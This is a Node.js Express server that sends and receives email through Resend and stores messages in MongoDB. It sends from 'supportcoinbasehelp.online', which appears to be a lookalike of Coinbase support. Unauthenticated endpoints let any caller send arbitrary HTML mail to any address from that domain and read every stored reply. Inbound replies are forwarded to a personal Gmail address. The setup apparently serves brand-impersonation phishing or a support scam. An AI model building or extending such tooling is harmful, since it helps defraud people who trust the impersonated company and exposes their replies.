const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
require('dotenv').config();
const { Resend } = require('resend');

const app = express();

// Define allowed origins
const allowedOrigins = [
  process.env.FRONTEND_URL,
  'http://localhost:3000'
];

const corsOptions = {
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Blocked by CORS: Origin not allowed'));
    }
  },
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());

// 1. Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('Connected to MongoDB successfully'))
  .catch((err) => console.error('MongoDB connection error:', err));

// 2. Define Email Schema & Model
const emailSchema = new mongoose.Schema({
  emailId: { type: String, required: true, unique: true },
  from: { type: String, required: true },
  to: [{ type: String }],
  subject: { type: String },
  text: { type: String },
  html: { type: String },
  receivedAt: { type: Date, default: Date.now },
});

const Email = mongoose.model('Email', emailSchema);

const resend = new Resend(process.env.RESEND_API_KEY);
const PORT = process.env.PORT || 5000;

// ROUTE: Outbound Send Email
app.post('/api/send-email', async (req, res) => {
  const { to, subject, htmlContent } = req.body;

  try {
    const { data, error } = await resend.emails.send({
      from: 'info@supportcoinbasehelp.online', // Use verified sub domain in production
      to: [to],
      subject: subject,
      html: htmlContent,
      replyTo: 'info@supportcoinbasehelp.online', // Optional: Set a reply-to address
    });

    if (error) {
      return res.status(400).json({ success: false, error });
    }

    return res.status(200).json({ success: true, data });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ROUTE: Inbound Webhook (Fetches full body & saves to MongoDB)
app.post('/api/webhook/inbound', async (req, res) => {
  const event = req.body;

  if (event.type === 'email.received') {
    const emailData = event.data;
    const emailId = emailData.email_id;

    try {
      // 1. Fetch the full email content (text, html, headers) from Resend
      const { data: fullEmail, error } = await resend.emails.receiving.get(emailId);

      if (error) {
        console.error('Failed to fetch full email content from Resend:', error);
        return res.status(400).json({ success: false, error });
      }

      // 2. Save the complete email details to MongoDB
      const newEmail = new Email({
        emailId: emailId,
        from: emailData.from,
        to: emailData.to,
        subject: emailData.subject,
        text: fullEmail.text || '',  // Fetched body text
        html: fullEmail.html || '',  // Fetched body HTML
      });

      await newEmail.save();
  
      console.log(`Successfully fetched and saved email ${emailId} to MongoDB.`);
      const adminEmail = process.env.ADMIN_EMAIL || 'ritolaikpo@gmail.com';

      // 3. Automatically send a confirmation email back to the sender
      const { error: sendError } = await resend.emails.send({
        from: '<info@supportcoinbasehelp.online>', // Replace with your verified subdomain address
        to: adminEmail,
        subject: `Re: ${emailData.subject || 'You received a message in your inbox'}`,
        html: `
          <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
            <p>You just received a message from ${emailData.from} You can send them a reply from your inbox.</p>
            <p style="color: #718096; font-size: 12px; margin-top: 20px;">— Client Support Team</p>
          </div>
        `,
      });

      if (sendError) {
        console.error('Failed to send auto-reply:', sendError);
      } else {
        console.log(`Auto-reply sent successfully to ${emailData.from}`);
      }

    } catch (dbErr) {
      console.error('Error processing inbound webhook:', dbErr.message);
    }
  }

  // Always respond with a 200 OK immediately to acknowledge receipt
  return res.status(200).json({ received: true });
});

// ROUTE: Fetch Inbox Messages for Frontend
app.get('/api/emails', async (req, res) => {
  try {
    // Retrieve all emails sorted by newest first
    const emails = await Email.find().sort({ receivedAt: -1 });
    return res.status(200).json({ success: true, emails });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Backend server running on port ${PORT}`);
});